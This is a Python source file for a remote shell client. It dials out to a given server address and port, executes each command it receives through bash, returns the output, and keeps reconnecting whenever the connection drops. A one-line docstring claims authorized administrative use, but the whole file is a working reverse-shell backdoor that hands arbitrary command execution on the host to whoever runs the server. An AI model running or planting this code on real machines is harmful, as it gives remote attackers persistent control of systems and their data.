#!/usr/bin/env python3
"""Remote shell client that connects to a control server.

Usage:
    python3 client.py --server 192.168.1.10 --port 9000

This is intended for authorized administrative use only.
"""

import argparse
import socket
import subprocess
import sys


def recv_exact(sock, length):
    chunks = []
    remaining = length
    while remaining > 0:
        chunk = sock.recv(remaining)
        if not chunk:
            return b""
        chunks.append(chunk)
        remaining -= len(chunk)
    return b"".join(chunks)


def recv_message(sock):
    header = recv_exact(sock, 4)
    if not header:
        return None
    length = int.from_bytes(header, byteorder="big", signed=False)
    if length == 0:
        return b""
    return recv_exact(sock, length)


def send_message(sock, payload):
    sock.sendall(len(payload).to_bytes(4, byteorder="big", signed=False))
    sock.sendall(payload)


def execute_command(command):
    result = subprocess.run(
        ["bash", "-lc", command],
        capture_output=True,
        text=True,
        shell=False,
    )
    return (result.stdout + result.stderr).encode("utf-8", errors="replace")


def start_client(server_host, server_port, reconnect=True):
    while True:
        try:
            with socket.create_connection((server_host, int(server_port)), timeout=5) as sock:
                print(f"[+] Connected to {server_host}:{server_port}")
                while True:
                    incoming = recv_message(sock)
                    if incoming is None:
                        print("[!] Server disconnected.")
                        return
                    command = incoming.decode("utf-8", errors="replace").strip()
                    if not command:
                        continue
                    if command.upper() == "QUIT":
                        print("[+] Server requested shutdown.")
                        return
                    output = execute_command(command)
                    send_message(sock, output)
        except (ConnectionRefusedError, OSError):
            if not reconnect:
                print(f"[!] Unable to connect to {server_host}:{server_port}")
                return
            print(f"[!] Connection lost. Reconnecting in 3 seconds...")
            import time
            time.sleep(3)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Client for a minimal remote-control server.")
    parser.add_argument("--server", default="127.0.0.1", help="Server IP address or hostname.")
    parser.add_argument("--port", type=int, default=9000, help="Server port.")
    parser.add_argument("--no-reconnect", action="store_true", help="Do not retry connection attempts.")
    args = parser.parse_args()

    start_client(args.server, args.port, reconnect=not args.no_reconnect)
